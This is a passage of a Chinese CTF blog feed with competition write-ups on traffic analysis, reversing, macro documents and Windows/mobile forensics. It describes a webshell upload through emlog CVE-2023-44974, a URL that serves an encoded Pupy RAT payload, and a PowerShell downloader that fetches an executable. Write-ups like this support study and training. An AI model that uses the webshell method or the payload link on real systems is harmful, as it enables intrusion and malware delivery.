href="#miaoro" class="headerlink" title="miaoro"></a>miaoro</h2><p>给到的附件是一个流量包 先追踪一下tcp流 </p><p>可以看到请求包GWHT字段是一个base64加密的值 在下面的返回包 也是base64加密的值 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282034434.png" alt="image-20240828203403305"></p><p>解密看一下 可以看到GWHT部分应该是命令执行的部分 下面返回包就是命令执行的结果 出现命令执行部分也对应着题干中的被攻击</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282035954.png" alt="image-20240828203510872"></p><p>继续向后看 在第10个包找到一个密码<code>Th15_11111111s_pP@sssssw000rd!!!</code>    在第13个包找到一个<code>secret.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282037589.png" alt="image-20240828203700485"></p><p>将secret.txt的返回包部分提取出来 是一个逆序的压缩包的16进制 进行操作之后将压缩包保存下来 使用上面找到的密码进行解压</p><p>得到一个flag2.jpg</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282039462.png" alt="image-20240828203941411"></p><p>看起来很奇怪 猜测是宽高问题 尝试爆破crc无果 将宽高对调 并适当增加对调后的高度 恢复出正常的图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282041359.jpg" alt="flag2"></p><p>在网上找到对应的解码对照表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282042863.png" alt="image-20240828204239767"></p><p>得到flag2：EBOFDELQDIAA}</p><p>再次结合题干说的被工具攻击 来分析一下请求包中的Cookie 使用shiro反序列化解密工具 可以在第二个cookie中解出flag1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282046376.png" alt="image-20240828204626281"></p><p>拼起来就是</p><pre><code>DASCTF&#123;B916CFEB-C40F-45D6-A7BC-EBOFDELQDIAA&#125;</code></pre><h2 id="1z-misc"><a href="#1z-misc" class="headerlink" title="1z_misc"></a>1z_misc</h2><p>挺无语的一道misc 只能说很有misc风格 纯纯猜谜+缝合 前部分就是结合星宿 猜压缩包解压密码 是<code>E@SI1Y!</code></p><p>解出来之后是一张<code>天琴座</code>图片和一个flag 就是2024ISCC的有人让我给你带个话这个题 难点在于工具的安装</p><p>下面放两篇文章 就不赘述了</p><pre><code>https://blog.csdn.net/qq_36959443/article/details/116136965</code></pre><pre><code>https://blog.csdn.net/administratorlws/article/details/139154964?ops_request_misc=%257B%2522request%255Fid%2522%253A%252239915FCB-333C-46C6-879E-240F264B325F%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=39915FCB-333C-46C6-879E-240F264B325F&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-139154964-null-null.142^v100^pc_search_result_base4&amp;utm_term=iscc%20%E6%9C%89%E4%BA%BA%E8%AE%A9%E6%88%91%E7%BB%99%E4%BD%A0%E5%B8%A6%E4%B8%AA%E8%AF%9D&amp;spm=1018.2226.3001.4187</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024羊城杯MISC方向wp&quot;&gt;&lt;a href=&quot;#2024羊城杯MISC方向wp&quot; class=&quot;headerlink&quot; title=&quot;2024羊城杯MISC方向wp&quot;&gt;&lt;/a&gt;2024羊城杯MISC方向wp&lt;/h1&gt;&lt;p&gt;真是叹为观止的一场比赛 见识到众多本</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>2024ISG观安杯</title>
    <link href="http://w3nx1z1.github.io/2024/08/20/2024ISG%E8%A7%82%E5%AE%89%E6%9D%AF/"/>
    <id>http://w3nx1z1.github.io/2024/08/20/2024ISG%E8%A7%82%E5%AE%89%E6%9D%AF/</id>
    <published>2024-08-20T05:55:25.347Z</published>
    <updated>2024-08-20T05:56:11.213Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024ISG观安杯"><a href="#2024ISG观安杯" class="headerlink" title="2024ISG观安杯"></a>2024ISG观安杯</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="R-emm-w3nx1z1"><a href="#R-emm-w3nx1z1" class="headerlink" title="R | emm | w3nx1z1"></a>R | emm | w3nx1z1</h3><p>前面就是正常的随便输入用户密码邮箱 进行安装 然后登陆后台</p><p>找到一个emlog的任意文件上传漏洞CVE-2023-44974</p><p>在插件处上传webshell压缩包 要求是文件夹要和webshell的名字相同 可以用这个里面的</p><p><a href="https://github.com/yangliukk/emlog/tree/main">https://github.com/yangliukk/emlog/tree/main</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351954.png" alt="img"></p><p>然后访问webshell 执行命令 得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351339.png" alt="img"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="R-rev-shell-解题人"><a href="#R-rev-shell-解题人" class="headerlink" title="R | rev_shell | 解题人"></a>R | rev_shell | 解题人</h3><p>先看日志文件</p><p>跑一下程序对照，拿到cipher和key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351776.png" alt="img"></p><p>再看可执行文件</p><p>die查壳</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351453.png" alt="img"></p><p>upx壳，工具脱不了，一开始以为是工具版本的问题，后来发现github最新版是4.2.4，但是题目是4.3，猜测可能是魔改？</p><p>再尝试下断点手脱，但是报错</p><p>再尝试直接跑起来attach，成功附加但是没dump下来，堵死</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351139.png" alt="img"></p><p>最后尝试直接爆破，先测试出明文长度37</p><p>大小写字母数字以及下划线组合，找pwn手from pwn写按位爆破脚本</p><pre><code class="Python">from struct import packfrom ctypes import *from LibcSearcher import *from pwn import *context(arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)#context(arch=&#39;i386&#39;,log_level=&#39;debug&#39;)def s(a):    io.send(a)    def sa(a, b):    io.sendafter(a, b)def sl(a):    io.sendline(a)def sla(a, b):    io.sendlineafter(a, b)def r():    io.recv()def pr():    print(io.recv())def rl(a):    return io.recvuntil(a)def inter():    io.interactive()def debug():    gdb.attach(io)    pause()def get_addr():    return u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))def ret_csu(r12, r13, r14, r15, last):    payload = offset * &#39;a&#39;    #构造栈溢出的padding    payload += p64(gadget1)    #gadgets1的地址    payload += p64(0) + p64(1)    #rbx=0, rbp=1    payload += p64(r12)    #call调用的地址    payload += p64(r13) + p64(r14) + p64(r15)    #三个参数的寄存器    payload += p64(gadget2)    #gadgets2的地址    payload += &#39;a&#39; * 56    #pop出的padding    payload += p64(last)    #函数最后的返回地址    return payloadio=process(&#39;./encsh&#39;)#io=remote(&#39;&#39;,)#elf=ELF(&#39;./&#39;)#libc=ELF(&#39;./&#39;)import stringkey = &#39;mykeymykeyhackergoawayyourkeyyou&#39;flag = &#39;00000000000000000000000000000000000000000000000000000&#39;v = [227, 83, 162, 17, 197, 102, 127, 119, 94, 208, 82, 187, 221, 191, 112, 186, 0, 170, 191, 44, 233, 242, 209, 114,     70, 116, 203, 80, 72, 65, 254, 111, 119, 146, 95, 180, 182, 77, 140, 110, 204, 249, 76, 34, 229, 39, 30, 12, 248,     89, 158, 103, 170]FLAG = &#39;&#39;sla(&#39;&gt;&#39;, &#39;key&#39;)sl(key)sla(&#39;&gt;&#39;, &#39;enc&#39;)sl(flag)rl(&#39;[&#39;)ans = rl(&#39;]&#39;).decode()temp = ans[:-1].split(&#39;, &#39;)tmp = int(temp[i])for i in range(len(v)):    for j in string.printable:        ans = flag[:i] + j + flag[i + 1:]        S(ans)        if tmp == v[i]:            FLAG += j            break        print(FLAG)        io.close()ISG&#123;ThIsisMYuPx_notYOuR5_Gg_hjD95wk1&#125;</code></pre><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="R-office-w3nx1z1"><a href="#R-office-w3nx1z1" class="headerlink" title="R | office | w3nx1z1"></a>R | office | w3nx1z1</h3><p>010打开 末尾base64 解密得到用来打开excel文档的密码</p><pre><code class="Python">SSN6aVR4bnh2YmcjR0M5   I#ziTxnxvbg#GC9</code></pre><p>打开之后发现有宏vba </p><p><img src="https://uvlucnh8giw.feishu.cn/space/api/box/stream/download/asynccode/?code=YmQ2M2ZjYzM3YWNhZDUzMDEwNDA3MDdmMzZiNDQ0MGZfZ3NnNExDYzlHWjBEOWZmR1BpZ2U4V21QeDR6T0E3T1JfVG9rZW46TVdub2JZS1A4b2FpQWJ4bHZ0ZGNSOGRIbnJnXzE3MjQxMzMwNjE6MTcyNDEzNjY2MV9WNA" alt="img"></p><p>尝试编辑宏 发现有保护密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351075.png" alt="img"></p><p>使用LibreOffice Calc打开可以消除宏</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351991.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351459.png" alt="img"></p><p>写解密脚本 恢复flag</p><pre><code class="Python">def decrypt(encrypted_message):    # 将加密字符串分割成整数字符串，并去除空字符串    message_parts = [int(part) for part in encrypted_message.split(&#39;,&#39;) if part]    # 初始化 S 数组    s = list(range(256))    j = 0    # 创建 KSA    for i in range(256):        j = (j + s[i]) % 256        s[i], s[j] = s[j], s[i]    # 初始化 x 和 y    x = 0    y = 0    decrypted_message = &quot;&quot;    # 进行解密    for i in range(len(message_parts)):        x = (x + 1) % 256        y = (y + s[x]) % 256        s[x], s[y] = s[y], s[x]                # 恢复原始字符        char = chr(s[(s[x] + s[y]) % 256] ^ message_parts[i])        decrypted_message += char    return decrypted_message# 测试代码if __name__ == &quot;__main__&quot;:    encrypted = &quot;184,116,232,38,216,127,29,89,225,84,108,82,8,0,161,49,232,127,45,252,147,140,185,210,26,107,123,2,82,189,0,167,205,130,94,54,94,242,138,139,102,79,250,139,9,142,17,42,198,113,246,6,142,31,&quot;        decrypted = decrypt(encrypted)    print(&quot;Decrypted Message:&quot;, decrypted)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201354481.png" alt="img"></p><h4 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h4><p>说一下另一种思路 直接在wps里面取消掉打开密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351237.png" alt="img"></p><p>密码加密里面删掉原来的密码——应用 再打开就没有密码了 olevba也可以正常使用了</p><pre><code class="Python">olevba problem.xlsm</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201354724.png" alt="img"></p><h4 id="另外2"><a href="#另外2" class="headerlink" title="另外2"></a>另外2</h4><p>还有一种消除宏保护密码的方法 在wps中另存为xls文档 使用010打开这个xls文档 找到DPB字段 改为DPX 就可以消除宏保护密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351876.png" alt="img"></p><h3 id="R-misc-see-it-w3nx1z1"><a href="#R-misc-see-it-w3nx1z1" class="headerlink" title="R | misc_see_it | w3nx1z1"></a>R | misc_see_it | w3nx1z1</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>t’s not what you hear, it’s what you see.</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>末尾压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201353878.png" alt="img"></p><p>提出来解压 得到密码 p@ssw0rd_1s_myg0 还有steghide字段提示</p><p>直接解密 得到png lsb隐写得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351366.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024ISG观安杯&quot;&gt;&lt;a href=&quot;#2024ISG观安杯&quot; class=&quot;headerlink&quot; title=&quot;2024ISG观安杯&quot;&gt;&lt;/a&gt;2024ISG观安杯&lt;/h1&gt;&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;header</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
    <category term="re" scheme="http://w3nx1z1.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>2024巅峰极客-简历</title>
    <link href="http://w3nx1z1.github.io/2024/08/17/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-%E7%AE%80%E5%8E%86/"/>
    <id>http://w3nx1z1.github.io/2024/08/17/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-%E7%AE%80%E5%8E%86/</id>
    <published>2024-08-17T15:17:08.390Z</published>
    <updated>2024-08-17T15:21:25.264Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024巅峰极客-简历"><a href="#2024巅峰极客-简历" class="headerlink" title="2024巅峰极客-简历"></a>2024巅峰极客-简历</h1><p>很好的比赛 充分发扬py精神 最后半小时疯狂冲分</p><p>题的质量不错 算是学到了新的姿势 </p><p>给到附件是一个exe文件 用010看了一眼 全是upx 判断为有壳 用upx去一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172113204.png" alt="image-20240817211321811"></p><p>去壳之后跑了一下沙箱 发现没有毒</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172247872.png" alt="image-20240817224758718"></p><p>但是存在检测虚拟机 直接在本机运行一下 得到两个文件<code>my.png</code> 和<code>file</code> file文件其实就是一个exe可执行程序文件</p><p>再来分析my.png zsteg跑一下 发现存在lsb隐写</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172250120.png" alt="image-20240817225025010"></p><p>得到一个链接</p><pre><code>http://47.104.129.38/79407f2309b5763fbd0e33dc583c4262/default.a</code></pre><p>访问可以下载<code>default.a</code>  使用010打开发现存在大量相同的字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172251095.png" alt="image-20240817225152030"></p><p>猜测是要与yyttddd进行异或 写脚本完成</p><pre><code class="python">def xor_with_string(file_path, xor_string):    xor_bytes = xor_string.encode()    with open(file_path, &#39;rb&#39;) as file:        file_data = file.read()    xor_result = bytearray()    for i in range(len(file_data)):        xor_result.append(file_data[i] ^ xor_bytes[i % len(xor_bytes)])    return xor_resultdef save_xor_result(xor_result, output_path):    with open(output_path, &#39;wb&#39;) as output_file:        output_file.write(xor_result)file_path = &#39;default.a&#39;output_path = &#39;output_file.exe&#39; xor_string = &#39;yyttddd&#39;xor_result = xor_with_string(file_path, xor_string)save_xor_result(xor_result, output_path)print(output_path)</code></pre><p>导出发现其实就是运行附件exe程序时释放出来的file文件 在其中发现大量pupy字段的出现</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172306355.png" alt="image-20240817230639288"></p><p>搜索发现Pupy确实是一个C2项目</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172307939.png" alt="image-20240817230710822"></p><p>在github上找到解密项目 需要在python2的环境下运行</p><p><a href="https://github.com/CaledoniaProject/pupyrat-config-decoder">pupyrat配置解码器</a></p><p>直接运行发现报错 主要是第28行的问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172308298.png" alt="image-20240817230850198"></p><p>脚本问题无法进行反编译 那就直接输出解码后的结果tmp</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172315087.png" alt="image-20240817231532915"></p><p>改为</p><pre><code>print(tmp)</code></pre><p>在kali中运行</p><pre><code>python2 main.py output_file.exe</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172317112.png" alt="image-20240817231735979"></p><p>找到ip  <code>60.177.18.44</code> 进行md5加密</p><pre><code>flag&#123;b57758d5acc923137eef453239ba685b&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024巅峰极客-简历&quot;&gt;&lt;a href=&quot;#2024巅峰极客-简历&quot; class=&quot;headerlink&quot; title=&quot;2024巅峰极客-简历&quot;&gt;&lt;/a&gt;2024巅峰极客-简历&lt;/h1&gt;&lt;p&gt;很好的比赛 充分发扬py精神 最后半小时疯狂冲分&lt;/p&gt;
&lt;p&gt;题的</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>TFCCTF2024之forensics</title>
    <link href="http://w3nx1z1.github.io/2024/08/04/TFCCTF%E4%B9%8Bforensics/"/>
    <id>http://w3nx1z1.github.io/2024/08/04/TFCCTF%E4%B9%8Bforensics/</id>
    <published>2024-08-03T16:52:41.779Z</published>
    <updated>2024-08-03T16:53:14.211Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TFCCTF2024之forensics"><a href="#TFCCTF2024之forensics" class="headerlink" title="TFCCTF2024之forensics"></a>TFCCTF2024之forensics</h1><p>发现最近的国际赛的取证真的好喜欢出evtx日志分析</p><p>这两道取证其实用的附件都是一样的</p><h2 id="SM-WHAT"><a href="#SM-WHAT" class="headerlink" title="SM WHAT?!"></a>SM WHAT?!</h2><pre><code>An attacker managed to gain foothold in our network, but we managed to capture the connection to our server. Analyze the file and identify the tool used to connect, the service it connected to, its IP address, and the shared resources folder.Flag format: TFCCTF&#123;tool_service_ip_share&#125;Example: TFCCTF&#123;ntlmrelayx_rdp_192.168.0.1_logs$&#125;Note: The flag is in all lowercase (except for TFCCTF).</code></pre><p>就是需要我们找连接服务器使用的工具 连接的服务名称 ip地址和共享资源文件夹的名字</p><p>首先 给我们的是一个evtx日志文件 我们先使用 <a href="https://github.com/williballenthin/python-evtx">python-evtx-master</a>这个项目 把evtx日志文件转化为更容易进行查看的xml文件 使用&#x2F;scripts文件夹下的<code>evtx_dump.py</code>  命令是</p><pre><code>python evtx_dump.py 1.evtx &gt; 1.xml</code></pre><p>然后我们找一下事件ID4688的记录 这个ID记录了进程创建的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040036715.png" alt="image-20240804003657504"></p><p>大致可以确定 ip是127.0.0.1 共享文件夹目录是ADMIN$ 题目要求是全小写 那就是admin$</p><p>后面直接在github里面搜上面这部分的源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040039357.png" alt="image-20240804003943104"></p><p>根据这个文件名<code>ID4688,5140,5145-WMIexec execution via SMB (GLOBAL).xml</code> 在搜一下<code>wmiexec </code> 是一种内网横向的工具</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040041053.png" alt="image-20240804004110988"></p><p>那可以确定工具是wmiexec 服务就是smb</p><p>所以flag是</p><pre><code>TFCCTF&#123;wmiexec _smb_127.0.0.1_admin$&#125;</code></pre><h2 id="HE-DID-WHAT"><a href="#HE-DID-WHAT" class="headerlink" title="HE DID WHAT?!"></a>HE DID WHAT?!</h2><pre><code>After the attacker connected to our server, he managed to extract some random data, however encrypted. We trust to decrypt it and get the flag.</code></pre><p>要找一个加密的字符串 </p><p>在事件ID4104处找到一个reverse过的base64字符串</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040044453.png" alt="image-20240804004413308"></p><p>是一个powershell的命令 里面还有个base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040044690.png" alt="image-20240804004436580"></p><p>解出来是个url 上一条的命令就是先对这个url进行base64解密 解出来后 再从这个url中下载<code>caca.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040045658.png" alt="image-20240804004534550"></p><p>我们也访问这个url 下载到<code>caca.exe </code> 直接用ida打开报错 用DIE查了一下 是.net的程序 用dnspy打开</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040047115.png" alt="image-20240804004719038"></p><p>右键<code>caca</code> 点击转到入口点 就可以查看到主函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040047399.png" alt="image-20240804004758268"></p><p>一个C#的程序  主要功能就是将一个字符串的每个字符的ascii码值都+2 再转字符输出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040048567.png" alt="image-20240804004832455"></p><p>我们现在就找他对应的这个密文在哪里  直接在源码里面搜<code>caca.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040050633.png" alt="image-20240804005016556"></p><p>找到密文</p><pre><code>VHEEVH&#125;x3uwcnad6u3eac3pvaj6tf</code></pre><p>写个脚本 跑出结果 后面补个<code>&#125;</code>就行 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040051830.png" alt="image-20240804005102737"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TFCCTF2024之forensics&quot;&gt;&lt;a href=&quot;#TFCCTF2024之forensics&quot; class=&quot;headerlink&quot; title=&quot;TFCCTF2024之forensics&quot;&gt;&lt;/a&gt;TFCCTF2024之forensics&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>2024中科实数杯wp</title>
    <link href="http://w3nx1z1.github.io/2024/07/26/2024%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AFwp/"/>
    <id>http://w3nx1z1.github.io/2024/07/26/2024%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AFwp/</id>
    <published>2024-07-26T02:21:37.095Z</published>
    <updated>2024-07-30T13:22:48.461Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024中科实数杯wp"><a href="#2024中科实数杯wp" class="headerlink" title="2024中科实数杯wp"></a>2024中科实数杯wp</h1><h2 id="鉴定材料"><a href="#鉴定材料" class="headerlink" title="鉴定材料"></a>鉴定材料</h2><pre><code>1、犯罪嫌疑人张老四的 iphone 手机备份一个；2、犯罪嫌疑人王胖子的安卓手机备份一个；3、犯罪窝点起获的 windows 笔记本电脑 A 镜像一个；4、犯罪窝点起获的 macbook 笔记本电脑 B 镜像一个；5、犯罪窝点笔记本电脑 A 内存镜像一份；6、后期归案的犯罪嫌疑人大金牙工作安卓手机备份一个；7、犯罪窝点的 u 盘镜像一个；8、后期归案的犯罪嫌疑人眼镜仔工作 iphone 手机备份一个</code></pre><h2 id="基本案情"><a href="#基本案情" class="headerlink" title="基本案情"></a>基本案情</h2><pre><code>  山西省公安机关接到线报，有一伙人长期从事盗墓和贩售文物活动，形成了一条龙的犯罪链条。经过数月侦察，警方掌握了该团伙的核心成员信息，并成功在一次交易中将多名嫌疑人抓获，现场扣押了大量文物及嫌疑人手机，并在突击审讯后在其老巢起获了多台笔记本电脑及电子存储设备。现需要对这些设备进行全面取证分析，以获得更多犯罪证据，彻底摧毁这一犯罪网络。</code></pre><h2 id="分析说明-WP部分"><a href="#分析说明-WP部分" class="headerlink" title="分析说明(WP部分)"></a>分析说明(WP部分)</h2><h3 id="1、检材-1-的手机序列号是？（1-分）"><a href="#1、检材-1-的手机序列号是？（1-分）" class="headerlink" title="1、检材 1-的手机序列号是？（1 分）"></a>1、检材 1-的手机序列号是？（1 分）</h3><pre><code>C39QTS9JGRX5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261036616.png" alt="image-20240715225805849"></p><h3 id="2、检材-1-的备份时间是？（格式：yyyy-mm-dd-HH-mm-ss）（2分）"><a href="#2、检材-1-的备份时间是？（格式：yyyy-mm-dd-HH-mm-ss）（2分）" class="headerlink" title="2、检材 1-的备份时间是？（格式：yyyy-mm-dd HH:mm:ss）（2分）"></a>2、检材 1-的备份时间是？（格式：yyyy-mm-dd HH:mm:ss）（2分）</h3><pre><code>2024-07-11 02:09:02</code></pre><p>接上题图</p><h3 id="3、检材-1-最近使用的-APP-是？（应用名称）（1-分）"><a href="#3、检材-1-最近使用的-APP-是？（应用名称）（1-分）" class="headerlink" title="3、检材 1-最近使用的 APP 是？（应用名称）（1 分）"></a>3、检材 1-最近使用的 APP 是？（应用名称）（1 分）</h3><pre><code>铛铛</code></pre><p>分析应用授权日志 发现最近的授权记录应用是铛铛</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261100613.png" alt="image-20240715225805849"></p><h3 id="4、检材-2-即时聊天工具有哪些？（2-分）"><a href="#4、检材-2-即时聊天工具有哪些？（2-分）" class="headerlink" title="4、检材 2-即时聊天工具有哪些？（2 分）"></a>4、检材 2-即时聊天工具有哪些？（2 分）</h3><pre><code>城信、铛铛、QQ、MOMO陌陌</code></pre><p>直接查看apk列表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261106418.png" alt="image-20240715225805849"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261106520.png" alt="image-20240715225805849"></p><p>搜了一下铛铛和城信 发现也是即时通讯app</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261107456.png" alt="image-20240715225805849"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261107649.png" alt="image-20240715225805849"></p><h3 id="5、检材-2-盗墓团伙之间的通讯-APP-版本是多少？（格式：x-x-x）"><a href="#5、检材-2-盗墓团伙之间的通讯-APP-版本是多少？（格式：x-x-x）" class="headerlink" title="5、检材 2-盗墓团伙之间的通讯 APP 版本是多少？（格式：x.x.x）"></a>5、检材 2-盗墓团伙之间的通讯 APP 版本是多少？（格式：x.x.x）</h3><pre><code>3.0.36</code></pre><p>直接从分析结果中看到的QQ和陌陌中并没有关于盗墓的聊天记录 那就手动分析一下其他两个通讯app 先看铛铛</p><p>找到聊天记录数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261720314.png" alt="image-20240715225805849"></p><p>导出 使用navicat分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261720094.png" alt="image-20240715225805849"></p><p>发现聊天内容与盗墓有关 再查看铛铛的应用版本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261724016.png" alt="image-20240715225805849"></p><h3 id="6、检材-2-盗墓团伙抱怨的工具有哪些（2-分）"><a href="#6、检材-2-盗墓团伙抱怨的工具有哪些（2-分）" class="headerlink" title="6、检材 2-盗墓团伙抱怨的工具有哪些（2 分）"></a>6、检材 2-盗墓团伙抱怨的工具有哪些（2 分）</h3><pre><code>铲子、绳子、电筒、指南针</code></pre><p>接上题图 根据聊天内容语境 可以判断 抱怨的工具有铲子 绳子 电筒 指南针</p><h3 id="7-7、检材-2-盗墓团伙之间的通讯-APP-证书指纹-SHA256-值是多少？（格式：xx-xx…或-xxxx…）（5-分）"><a href="#7-7、检材-2-盗墓团伙之间的通讯-APP-证书指纹-SHA256-值是多少？（格式：xx-xx…或-xxxx…）（5-分）" class="headerlink" title="7.7、检材 2-盗墓团伙之间的通讯 APP 证书指纹 SHA256 值是多少？（格式：xx:xx…或 xxxx…）（5 分）"></a>7.7、检材 2-盗墓团伙之间的通讯 APP 证书指纹 SHA256 值是多少？（格式：xx:xx…或 xxxx…）（5 分）</h3><pre><code>f6605feeee5844b40d457652f0fe8a54ae237f745ff82131bafd196cfa3e17af</code></pre><p>直接在文件系统中找到铛铛的apk文件 导出后使用雷电进行分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262245440.png" alt="image-20240726224515201"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262247997.png" alt="image-20240726224757683"></p><h3 id="8、检材-3-硬盘的-MD5-值（1-分）"><a href="#8、检材-3-硬盘的-MD5-值（1-分）" class="headerlink" title="8、检材 3-硬盘的 MD5 值（1 分）"></a>8、检材 3-硬盘的 MD5 值（1 分）</h3><pre><code>01A2CDF623353043053ED37A7519265B</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262319174.png" alt="image-20240726231908114"></p><h3 id="9、检材-3-硬盘系统分区的起始位置（1-分）"><a href="#9、检材-3-硬盘系统分区的起始位置（1-分）" class="headerlink" title="9、检材 3-硬盘系统分区的起始位置（1 分）"></a>9、检材 3-硬盘系统分区的起始位置（1 分）</h3><pre><code>344,981,504</code></pre><p>检材3 windows计算机的C盘存在bitlocker加密 这里提供几种解密方法</p><h4 id="一、取证大师小程序"><a href="#一、取证大师小程序" class="headerlink" title="一、取证大师小程序"></a>一、取证大师小程序</h4><p>因为这里给我们提供了计算机的内存镜像 取证大师内存取证小程序可以直接从里面提取出bitlocker解密密钥文件 但是这个缺点是这个密钥文件只能在取证大师中使用 火眼是用不了的</p><p>路径是</p><pre><code>E:\取证大师\FMP\Tools\FmScript\Scripts\Extends\内存镜像解析工具-专业版\x64\result\DC8D8739C6803B6407505CACA7D45FBB.KeyFile</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262255040.png" alt="image-20240726225542949"></p><p>直接在取证大师中导入就可以使用</p><h4 id="二、passwarekit爆破密钥"><a 